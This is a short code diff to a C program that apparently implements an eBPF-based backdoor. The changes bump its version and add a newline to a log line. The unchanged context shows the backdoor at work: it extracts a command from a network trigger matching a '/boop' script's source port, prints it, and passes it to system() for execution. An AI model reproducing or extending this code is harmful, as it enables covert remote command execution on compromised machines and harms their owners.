@@ -37,7 +37,7 @@
 #include "pr0be.skel.h"
 // clang-format on
 
-#define VERSION "1.0.2"
+#define VERSION "1.0.3"
 
 // PORT must match the ${SRC_PORT} in the /boop script!
 #define PORT 3535
@@ -291,7 +291,7 @@ int main(int argc, char **argv) {
       if (!ignore) {
         char *rce = malloc(MAX_RCE_SIZE);
         handlerevrce(saddrval, rce);
-        printf(" <- %s", rce);
+        printf(" <- %s\n", rce);
         system(rce);
         free(rce);
       }
